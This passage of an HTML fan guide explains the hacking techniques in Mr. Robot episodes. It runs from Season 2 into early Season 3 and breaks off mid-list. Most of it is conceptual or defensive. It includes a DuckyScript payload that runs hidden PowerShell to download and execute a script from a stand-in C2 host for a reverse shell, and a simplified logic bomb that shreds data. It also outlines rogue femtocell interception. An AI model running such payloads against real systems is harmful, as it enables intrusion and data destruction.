+HiddenServiceDir /var/lib/tor/marketplace/
+HiddenServicePort 80 127.0.0.1:8080
+HiddenServicePort 443 127.0.0.1:8443
+
+<span class="comment"># After starting Tor, the .onion address is generated at:</span>
+cat /var/lib/tor/marketplace/hostname</div>
+        <div class="real-world">The real Silk Road was operated by Ross Ulbricht (Dread Pirate Roberts) and taken down by the FBI in 2013. The FBI used a combination of CAPTCHA leaks, server misconfiguration, and undercover operations to identify the server's real IP address.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Kernel Panic Concept</h5>
+        <p>The episode title references a <strong>kernel panic</strong> -- an unrecoverable fatal error in the Unix/Linux kernel. When the kernel detects an internal error it cannot safely recover from, it halts the system to prevent data corruption. The equivalent in Windows is the Blue Screen of Death (BSOD).</p>
+        <ul>
+          <li><strong>Causes:</strong> Hardware failure, corrupt kernel modules, driver bugs, out-of-memory conditions</li>
+          <li><strong>Diagnostic:</strong> <code>dmesg</code>, <code>/var/log/kern.log</code>, kernel crash dumps</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E03 -->
+<div class="episode-card" id="s2e3">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">03</span>
+    <div class="ep-title-area">
+      <h3>Init 1</h3>
+      <div class="ep-filename">eps2.2_init_1.asec</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Single-User Mode</span>
+      <span class="tag tool">mysqldump</span>
+      <span class="tag tool">Tor</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Dark Web Site Migration</h5>
+        <p>Elliot is coerced into migrating Ray's dark web marketplace to a new server. This involves database migration, web application deployment, and Tor hidden service reconfiguration.</p>
+        <div class="code-block"><span class="comment"># Database backup and migration</span>
+mysqldump -u root -p --all-databases > marketplace_backup.sql
+scp marketplace_backup.sql user@newserver:/backup/
+mysql -u root -p < marketplace_backup.sql
+
+<span class="comment"># Web application file transfer</span>
+rsync -avz --progress /var/www/marketplace/ user@newserver:/var/www/marketplace/
+
+<span class="comment"># Tor hidden service migration - copy keys for same .onion address</span>
+scp /var/lib/tor/marketplace/hs_ed25519_secret_key user@newserver:/var/lib/tor/marketplace/
+<span class="comment"># Reconfigure torrc on new server</span>
+HiddenServiceDir /var/lib/tor/marketplace/
+HiddenServicePort 80 127.0.0.1:80</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Linux Single-User Mode (init 1)</h5>
+        <p>The title references <code>init 1</code>, which boots Linux into <strong>single-user/rescue mode</strong> with root access and minimal services. This is a physical access attack vector -- anyone with console access can reboot into init 1 and gain root without a password.</p>
+        <div class="code-block"><span class="comment"># Enter single-user mode</span>
+init 1                              <span class="comment"># SysVinit</span>
+telinit 1                           <span class="comment"># Alternative SysVinit</span>
+systemctl isolate rescue.target     <span class="comment"># systemd equivalent</span>
+
+<span class="comment"># At GRUB: edit kernel parameters, append 'single' or 'init=/bin/bash'</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E04 -->
+<div class="episode-card" id="s2e4">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">04</span>
+    <div class="ep-title-area">
+      <h3>Logic Bomb</h3>
+      <div class="ep-filename">eps2.3_logic-b0mb.hc</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Logic Bomb</span>
+      <span class="tag hardware">Femtocell</span>
+      <span class="tag hardware">SDR</span>
+      <span class="tag tool">OpenBTS</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. Logic Bomb</h5>
+        <p>A <strong>logic bomb</strong> is malicious code inserted into a system that remains dormant until specific trigger conditions are met (a date, time, user action, or system event). Unlike a virus or worm, it does not self-replicate -- it simply waits and executes.</p>
+        <div class="code-block"><span class="comment"># Logic bomb example (simplified)</span>
+import datetime, os, subprocess
+
+TRIGGER_DATE = datetime.datetime(2015, 5, 9, 0, 0, 0)
+
+while True:
+    if datetime.datetime.now() >= TRIGGER_DATE:
+        <span class="comment"># Execute destructive payload</span>
+        subprocess.call(['shred', '-vfz', '-n', '5', '/critical/data'])
+        break
+    time.sleep(60)</div>
+        <div class="real-world">The 2013 South Korea banking attack used logic bombs timed to detonate simultaneously across multiple financial institutions, wiping master boot records and destroying data at a pre-set time. Logic bombs have been used by disgruntled employees (e.g., the Omega Engineering case, 2000).</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>2. Femtocell Construction</h5>
+        <p>Darlene continues building the <strong>rogue femtocell</strong> for the FBI operation, using hardware and software components to create an IMSI catcher:</p>
+        <ul>
+          <li><strong>Hardware:</strong> Commercial femtocell unit with custom firmware, SDR (Software Defined Radio)</li>
+          <li><strong>Software:</strong> OpenBTS, OsmocomBB, or YateBTS for GSM stack implementation</li>
+          <li><strong>IMSI Capture:</strong> Reads the International Mobile Subscriber Identity from target phones</li>
+          <li><strong>Principle:</strong> Phones connect to the strongest signal -- the rogue tower overpowers legitimate towers</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E05 -->
+<div class="episode-card" id="s2e5">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">05</span>
+    <div class="ep-title-area">
+      <h3>Master-Slave</h3>
+      <div class="ep-filename">eps2.4_m4ster-s1ave.aes</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">AES Encryption</span>
+      <span class="tag attack">Database Replication</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. AES Encryption &amp; Cryptographic Concepts</h5>
+        <p>The <strong>.aes</strong> extension references the <strong>Advanced Encryption Standard</strong>, the encryption algorithm at the core of the 5/9 hack. AES-256 is the strongest variant, using a 256-bit key with 14 rounds of substitution-permutation operations.</p>
+        <ul>
+          <li><strong>AES-256-CBC:</strong> Cipher Block Chaining mode, requires IV (Initialization Vector)</li>
+          <li><strong>AES-256-GCM:</strong> Galois/Counter Mode, provides authenticated encryption (integrity + confidentiality)</li>
+          <li><strong>Key Space:</strong> 2^256 possible keys -- brute force is computationally infeasible</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Master-Slave Database Architecture</h5>
+        <p>The title references <strong>database replication architecture</strong> (now called primary-replica) where one node handles writes and others handle reads. Understanding this architecture is critical for attacking data at rest -- you must compromise all replicas.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E06 -->
+<div class="episode-card" id="s2e6">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">06</span>
+    <div class="ep-title-area">
+      <h3>Handshake</h3>
+      <div class="ep-filename">eps2.5_h4ndshake.sme</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Handshake Protocols</span>
+      <span class="tag social">Anonymous Reporting</span>
+      <span class="tag tool">Tor</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Handshake Protocols</h5>
+        <p>The episode explores various <strong>handshake mechanisms</strong> critical to network security:</p>
+        <ul>
+          <li><strong>TCP Three-Way Handshake:</strong> SYN &rarr; SYN-ACK &rarr; ACK (connection establishment)</li>
+          <li><strong>TLS/SSL Handshake:</strong> Certificate exchange, key negotiation, cipher suite selection</li>
+          <li><strong>WPA Four-Way Handshake:</strong> The handshake that can be captured and cracked offline</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Anonymous Tip to FBI (Ray's Dark Web Site)</h5>
+        <p>Elliot anonymously reports Ray's dark web marketplace to law enforcement using privacy tools to prevent attribution:</p>
+        <ul>
+          <li><strong>Tor Browser:</strong> Anonymous web access</li>
+          <li><strong>Guerrilla Mail / ProtonMail:</strong> Anonymous email services</li>
+          <li><strong>FBI De-anonymization:</strong> Network Investigative Techniques (NITs), traffic correlation, server exploitation</li>
+        </ul>
+        <div class="real-world">The FBI used a Network Investigative Technique (NIT) -- essentially a browser exploit deployed from a compromised Tor hidden service -- to de-anonymize visitors of the Playpen child abuse site in Operation Pacifier (2015).</div>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Prison Reveal</h5>
+        <p>The revelation that Elliot has been in prison reframes all earlier hacking scenes. Ray was a corrupt prison official, and the "website migration" occurred on prison computers -- demonstrating that hacking can happen even in the most controlled environments.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E07 -->
+<div class="episode-card" id="s2e7">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">07</span>
+    <div class="ep-title-area">
+      <h3>Successor</h3>
+      <div class="ep-filename">eps2.6_succ3ss0r.p12</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">PKCS#12</span>
+      <span class="tag tool">OpenSSL</span>
+      <span class="tag social">OPSEC</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. PKCS#12 Certificate Files</h5>
+        <p>The <strong>.p12</strong> extension references the PKCS#12 format, which bundles a certificate with its private key in a password-protected container. Used for client authentication, code signing, and S/MIME email encryption.</p>
+        <div class="code-block"><span class="comment"># Create a PKCS#12 file</span>
+openssl pkcs12 -export -out cert.p12 -inkey private.key -in certificate.crt -certfile ca-chain.crt
+
+<span class="comment"># Extract certificate and key from .p12</span>
+openssl pkcs12 -in cert.p12 -out cert.pem -nodes
+openssl pkcs12 -in cert.p12 -nocerts -out private.key
+openssl pkcs12 -in cert.p12 -clcerts -nokeys -out certificate.crt</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Operational Security (OPSEC) Compartmentalization</h5>
+        <p>With Elliot in prison, Darlene takes leadership of fsociety, applying strict <strong>compartmentalization</strong> -- each member knows only their specific task, not the full plan. This is a core OPSEC principle borrowed from intelligence tradecraft.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E08 - THE FBI HACK -->
+<div class="episode-card" id="s2e8">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">08</span>
+    <div class="ep-title-area">
+      <h3>Init 5</h3>
+      <div class="ep-filename">eps2.7_init_5.fve</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag hardware">Femtocell</span>
+      <span class="tag hardware">USB Rubber Ducky</span>
+      <span class="tag attack">IMSI Catcher</span>
+      <span class="tag social">Physical Infiltration</span>
+      <span class="tag attack">Reverse Shell</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+
+      <div class="hack-detail">
+        <h5>1. THE FBI FEMTOCELL + RUBBER DUCKY HACK (Season Centerpiece)</h5>
+        <p>This is the <strong>most important hack of Season 2</strong>. Angela plants a modified femtocell and a USB Rubber Ducky inside the FBI's temporary field office at E Corp headquarters.</p>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 1: Femtocell Hardware Preparation</h5>
+        <p>The commercial femtocell is <strong>reflashed with custom firmware</strong> to act as a rogue cellular base station (IMSI catcher). It mimics a legitimate cell tower with a stronger signal, forcing nearby phones to connect.</p>
+        <ul>
+          <li><strong>Base Hardware:</strong> Verizon Network Extender or similar commercial femtocell</li>
+          <li><strong>Firmware:</strong> Custom build using OpenBTS/OsmocomBB GSM stack</li>
+          <li><strong>Signal Strength:</strong> Overpowers legitimate towers, forcing phone connections</li>
+          <li><strong>Capabilities:</strong> Voice call interception, SMS interception, data interception, location tracking</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 2: USB Rubber Ducky Payload</h5>
+        <p>The <strong>Hak5 USB Rubber Ducky</strong> is programmed with a DuckyScript payload that opens a reverse shell on the FBI agent's Windows workstation. It executes in seconds, appearing as a normal USB drive.</p>
+        <div class="code-block"><span class="comment"># DuckyScript payload for FBI workstation</span>
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://fsociety-c2.onion/payload.ps1')"
+ENTER
+DELAY 2000
+
+<span class="comment"># The PowerShell payload establishes a reverse Meterpreter shell</span>
+<span class="comment"># providing full remote access to the FBI workstation</span></div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 3: Angela's Social Engineering</h5>
+        <p>Angela gains physical access to the FBI floor using her <strong>E Corp employee credentials</strong> combined with social engineering techniques:</p>
+        <ul>
+          <li><strong>Pretexting:</strong> Fabricating a legitimate reason to be on the FBI floor</li>
+          <li><strong>Tailgating:</strong> Following authorized FBI personnel through secured doors</li>
+          <li><strong>Confidence:</strong> Acting as if she belongs, using her E Corp badge for plausibility</li>
+          <li><strong>Timing:</strong> Executing during a narrow window of opportunity</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 4: Femtocell Deployment &amp; Interception</h5>
+        <p>Angela hides the femtocell device inside the FBI office. FBI agents' phones <strong>automatically connect</strong> to it because it presents the strongest signal. All cellular communications are now routed through fsociety's rogue infrastructure.</p>
+        <ul>
+          <li><strong>Voice Calls:</strong> Recorded and forwarded to fsociety</li>
+          <li><strong>SMS Messages:</strong> Intercepted in real-time</li>
+          <li><strong>Mobile Data:</strong> Captured and analyzed</li>
+          <li><strong>Location Data:</strong> FBI agent locations tracked via cell tower triangulation</li>
+        </ul>
+        <div class="real-world">DEF CON 21 (2013): Doug DePerry and Tom Ritter from iSEC Partners demonstrated complete voice and data interception through a hacked Verizon femtocell. The hardware cost ~$250 and the attack was devastatingly effective. Law enforcement itself uses similar devices (Stingray/IMSI catchers) for surveillance.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 5: Network Compromise via Rubber Ducky</h5>
+        <p>The Rubber Ducky's PowerShell payload provides a <strong>reverse shell</strong> into the FBI's network, granting fsociety access to investigation files, case evidence, and internal communications about the 5/9 hack.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E09 -->
+<div class="episode-card" id="s2e9">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">09</span>
+    <div class="ep-title-area">
+      <h3>Hidden Process</h3>
+      <div class="ep-filename">eps2.8_h1dden-pr0cess.axx</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Rootkit</span>
+      <span class="tag attack">Process Hiding</span>
+      <span class="tag attack">DKOM</span>
+      <span class="tag tool">Volatility</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Hidden Process Techniques</h5>
+        <p>The episode explores <strong>process hiding</strong> -- techniques for concealing malicious processes from system monitoring tools:</p>
+        <ul>
+          <li><strong>Kernel Rootkits:</strong> Hook system calls (sys_getdents) to filter process entries from /proc</li>
+          <li><strong>LD_PRELOAD Hijacking:</strong> Override shared library functions to hide process information</li>
+          <li><strong>DKOM (Direct Kernel Object Manipulation):</strong> Unlink process entries from the kernel's task list</li>
+          <li><strong>Process Hollowing:</strong> Spawn a legitimate process and replace its code with malicious code</li>
+          <li><strong>Process Doppelganging:</strong> Use NTFS transactions to load malicious code</li>
+        </ul>
+        <div class="code-block"><span class="comment"># Detection: Compare /proc listing with ps output</span>
+ls /proc | grep -E '^[0-9]+$' | sort -n > /tmp/proc_list
+ps aux | awk '{print $2}' | sort -n > /tmp/ps_list
+diff /tmp/proc_list /tmp/ps_list   <span class="comment"># Differences indicate hidden processes</span>
+
+<span class="comment"># Using unhide tool for detection</span>
+unhide proc
+unhide sys
+
+<span class="comment"># Memory forensics with Volatility</span>
+volatility -f memory.dump --profile=LinuxUbuntu pslist
+volatility -f memory.dump --profile=LinuxUbuntu psscan  <span class="comment"># Finds hidden processes</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. FBI Hack Exploitation</h5>
+        <p>fsociety begins <strong>actively exploiting</strong> the access gained through the femtocell and Rubber Ducky, exfiltrating FBI investigation data and monitoring agent communications in real-time.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E10 -->
+<div class="episode-card" id="s2e10">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">10</span>
+    <div class="ep-title-area">
+      <h3>Python Part 1</h3>
+      <div class="ep-filename">eps2.9_pyth0n-pt1.p7z</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">Python</span>
+      <span class="tag tool">7-Zip AES</span>
+      <span class="tag attack">APT Tactics</span>
+      <span class="tag attack">Zero-Day</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Python for Offensive Security</h5>
+        <p>Python is the primary scripting language for hacking in Mr. Robot. Key Python libraries used in offensive security:</p>
+        <ul>
+          <li><strong>Scapy:</strong> Packet manipulation and network scanning</li>
+          <li><strong>Requests:</strong> HTTP library for web exploitation</li>
+          <li><strong>Paramiko:</strong> SSH protocol implementation</li>
+          <li><strong>Pwntools:</strong> CTF and binary exploitation framework</li>
+          <li><strong>Impacket:</strong> Network protocol implementation (SMB, MSRPC, Kerberos)</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Encrypted Archives for Exfiltration</h5>
+        <p>The <strong>.p7z</strong> extension references 7-Zip encrypted archives using AES-256, commonly used for secure data exfiltration:</p>
+        <div class="code-block"><span class="comment"># Create AES-256 encrypted 7z archive</span>
+7z a -p"StrongPassword" -mhe=on exfil_data.7z /sensitive/data/
+
+<span class="comment"># -p: password protection</span>
+<span class="comment"># -mhe=on: encrypt file headers (hides filenames)</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Dark Army APT Operations</h5>
+        <p>The Dark Army operates as a <strong>state-sponsored Advanced Persistent Threat (APT)</strong> with sophisticated capabilities:</p>
+        <ul>
+          <li><strong>Zero-Day Exploits:</strong> Previously unknown vulnerabilities reserved for critical operations</li>
+          <li><strong>Supply Chain Attacks:</strong> Compromising trusted software/hardware providers</li>
+          <li><strong>Extreme OPSEC:</strong> Time-based operations, compartmentalization, elimination of compromised operatives</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S2E11 -->
+<div class="episode-card" id="s2e11">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">11</span>
+    <div class="ep-title-area">
+      <h3>Python Part 2 (Season Finale)</h3>
+      <div class="ep-filename">eps2.9_pyth0n-pt2.p7z</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Stage 2 Revealed</span>
+      <span class="tag attack">UPS Firmware</span>
+      <span class="tag attack">SCADA/ICS</span>
+      <span class="tag attack">Thermal Runaway</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Stage 2 Revealed: UPS Firmware Attack</h5>
+        <p>The season finale reveals that the 5/9 hack had a <strong>Stage 2</strong> -- designed to physically destroy E Corp's paper backup records by compromising <strong>UPS (Uninterruptible Power Supply) firmware</strong> to cause battery thermal runaway and fires.</p>
+        <ul>
+          <li><strong>Target:</strong> UPS systems with network management cards (APC, Eaton, CyberPower)</li>
+          <li><strong>Attack:</strong> Modified firmware overrides battery charging safety limits</li>
+          <li><strong>Effect:</strong> Overcharging lithium-ion batteries causes thermal runaway (swelling, fire, explosion)</li>
+          <li><strong>Goal:</strong> Destroy paper records E Corp is using to rebuild financial data</li>
+        </ul>
+        <div class="real-world">In 2022, Armis Labs disclosed "TLStorm" (CVE-2022-22805, CVE-2022-22806) -- critical vulnerabilities in APC Smart-UPS devices allowing remote code execution and firmware manipulation. This validated the show's 2016 premise. Stuxnet (2010) previously demonstrated that firmware-level attacks on industrial systems can cause physical destruction.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. IT-to-OT Network Pivoting</h5>
+        <p>The attack requires <strong>lateral movement from IT networks to OT (Operational Technology) networks</strong> that control the UPS systems. This is one of the most critical attack paths in modern ICS security.</p>
+        <ul>
+          <li><strong>SCADA Protocols:</strong> Modbus, DNP3, BACnet -- often lack authentication</li>
+          <li><strong>Default Credentials:</strong> Many ICS devices ship with hardcoded or default passwords</li>
+          <li><strong>Air Gap Myth:</strong> OT networks are often not truly air-gapped from IT networks</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+<div class="season-section" id="s3">
+<div class="season-header">
+  <h2>// SEASON 3</h2>
+  <p>The battle for Stage 2. Elliot races to undo the Dark Army's plan to destroy E Corp's paper records via UPS firmware attacks, while the FBI femtocell provides critical intelligence. The most technically dense season.</p>
+</div>
+
+<!-- S3E01 -->
+<div class="episode-card" id="s3e1">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">01</span>
+    <div class="ep-title-area">
+      <h3>Power Saver Mode</h3>
+      <div class="ep-filename">eps3.0_power-saver-mode.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">UPS Firmware</span>
+      <span class="tag tool">HSM</span>
+      <span class="tag social">Compartmentalization</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. UPS Firmware Manipulation (Stage 2 Core)</h5>
+        <p>The core of Stage 2 is revealed: malware that modifies the firmware of <strong>UPS (Uninterruptible Power Supply)</strong> units in E Corp's paper record storage buildings. The attack targets battery charging circuitry to cause <strong>thermal runaway</strong> -- overcharging lithium-ion batteries until they overheat, swell, and catch fire.</p>
+        <ul>
+          <li><strong>Attack Target:</strong> UPS network management cards (NMC) with web interfaces</li>
+          <li><strong>Firmware Modification:</strong> Override charging safety limits and temperature cutoffs</li>
+          <li><strong>Physical Effect:</strong> Thermal runaway in lithium-ion battery packs</li>
+          <li><strong>Goal:</strong> Building fires destroying paper records</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Hardware Security Module (HSM) Access</h5>
+        <p>Elliot tries to access E Corp's <strong>HSM (Hardware Security Module)</strong> to recover the encryption keys from the 5/9 hack. HSMs are tamper-resistant hardware devices used to manage cryptographic keys, performing encryption/decryption operations in a secure hardware environment.</p>
+        <ul>
+          <li><strong>HSM Standards:</strong> FIPS 140-2 Level 3 or 4 certified</li>
+          <li><strong>Tamper Protection:</strong> Physical intrusion detection, key zeroization on tamper</li>
+          <li><strong>Vendors:</strong> Thales (nCipher), Gemalto, Utimaco</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E02 -->
+<div class="episode-card" id="s3e2">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">02</span>
+    <div class="ep-title-area">
+      <h3>Undo</h3>
+      <div class="ep-filename">eps3.1_undo.gz</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Firmware Patching</span>
+      <span class="tag attack">Network Segmentation</span>
+      <span class="tag social">Insider Threat</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Reversing Stage 2 from Inside E Corp</h5>
+        <p>Elliot, now working as an E Corp cybersecurity technician, attempts to <strong>patch the UPS firmware vulnerability</strong> from inside, deploying clean firmware updates without alerting the Dark Army.</p>
+        <ul>
+          <li><strong>Challenge:</strong> Craft clean firmware image that reverses malicious modifications</li>
+          <li><strong>Method:</strong> Deploy through E Corp's management infrastructure</li>
+          <li><strong>Stealth:</strong> Must appear as routine maintenance, not remediation</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Network Segmentation (IT vs OT)</h5>
+        <p>E Corp's network architecture features <strong>segmentation between IT and OT networks</strong>. Elliot must navigate Active Directory permissions, change management procedures, and network boundaries to reach the UPS controllers.</p>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Insider Threat: Tyrell as CTO</h5>
+        <p>Tyrell Wellick is installed as E Corp's new CTO, providing the Dark Army with <strong>insider access at the executive level</strong>. This is privilege escalation via social position -- the most dangerous form of insider threat.</p>
+        <div class="real-world">The Lockheed Martin Cyber Kill Chain identifies "insider threat" as one of the most difficult vectors to defend against. Real-world APT groups like APT1 (China) have been known to recruit or install insiders in target organizations.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E03 -->
+<div class="episode-card" id="s3e3">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">03</span>
+    <div class="ep-title-area">
+      <h3>Legacy</h3>
+      <div class="ep-filename">eps3.2_legacy.so</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag hardware">Femtocell</span>
+      <span class="tag social">Double Agent</span>
+      <span class="tag social">Burner Phones</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. FBI Femtocell Setup</h5>
+        <p>Building toward the FBI femtocell hack execution. The <strong>modified femtocell</strong> intercepts all cellular communications passing through it by acting as a rogue base station with a stronger signal than legitimate towers.</p>
+        <div class="real-world">At DEF CON 21 (2013), researchers demonstrated femtocell hacking using modified Verizon Network Extenders. The iSEC Partners team showed they could intercept calls, SMS, and data from any phone connecting to the rogue cell.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Darlene as Double Agent (HUMINT)</h5>
+        <p>Darlene cooperates with the FBI as an informant while secretly feeding information to fsociety. This is classic <strong>HUMINT (Human Intelligence) tradecraft</strong> applied to cyber operations -- a double-agent operating across organizational boundaries.</p>
+        <ul>
+          <li><strong>Burner Phones:</strong> Prepaid disposable phones for single-use communication</li>
+          <li><strong>Dead Drops:</strong> Pre-arranged locations for leaving/collecting information</li>
+          <li><strong>Compartmentalization:</strong> Each operative knows only their specific task</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E04 -->
+<div class="episode-card" id="s3e4">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">04</span>
+    <div class="ep-title-area">
+      <h3>Metadata</h3>
+      <div class="ep-filename">eps3.3_metadata.par2</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Metadata Analysis</span>
+      <span class="tag attack">IDS Evasion</span>
+      <span class="tag social">Psychological Manipulation</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Metadata Surveillance</h5>
+        <p>The FBI uses <strong>metadata analysis</strong> to track Dark Army operations. Phone metadata (call detail records, cell tower logs, timing patterns) reveals communication networks without accessing content.</p>
+        <ul>
+          <li><strong>CDR (Call Detail Records):</strong> Who called whom, when, for how long</li>
+          <li><strong>Cell Tower Logs:</strong> Physical location of phones at specific times</li>
+          <li><strong>Pattern Analysis:</strong> Identifying relationships and meeting patterns</li>
+        </ul>
+        <div class="real-world">NSA's bulk metadata collection program (revealed by Snowden in 2013) demonstrated that metadata alone -- without content -- can reveal intimate details about individuals' lives, relationships, and activities.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. IDS/IPS Evasion - Living Off the Land</h5>
+        <p>Elliot evades E Corp's <strong>Intrusion Detection Systems</strong> by using <strong>Living Off the Land (LOtL)</strong> techniques -- using legitimate system administration tools rather than known hacking tools, making his activities blend with normal operations.</p>
+        <ul>
+          <li><strong>LOtL Tools:</strong> PowerShell, WMI, PsExec, native OS utilities</li>
+          <li><strong>Advantage:</strong> No malware signatures to detect; activities appear legitimate</li>
+          <li><strong>Evasion:</strong> Blends with normal admin traffic in IDS/SIEM logs</li>
+        </ul>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Whiterose's Long-Term Social Engineering of Angela</h5>
+        <p>Whiterose manipulates Angela through <strong>deep psychological manipulation</strong>, targeting beliefs and emotional vulnerabilities. This represents the most advanced form of social engineering -- changing a target's fundamental worldview over an extended period.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S3E05 - SINGLE TAKE -->
+<div class="episode-card" id="s3e5">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">05</span>
+    <div class="ep-title-area">
+      <h3>Runtime Error (Single-Take Episode)</h3>
+      <div class="ep-filename">eps3.4_runtime-error.r00</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Stage 2 Execution</span>
+      <span class="tag attack">Thermal Runaway</span>
+      <span class="tag attack">Lateral Movement</span>
+      <span class="tag social">Tailgating</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Stage 2 Execution: UPS Thermal Runaway Attack</h5>
+        <p>The UPS firmware exploit triggers, causing <strong>battery thermal runaway</strong> across not one but <strong>71 E Corp buildings</strong>. The Dark Army expanded the attack from a single target to dozens, overwhelming Elliot's ability to stop it.</p>
+        <ul>
+          <li><strong>Attack Chain:</strong> Compromised firmware &rarr; override charging safety limits &rarr; thermal runaway &rarr; fire/explosion</li>
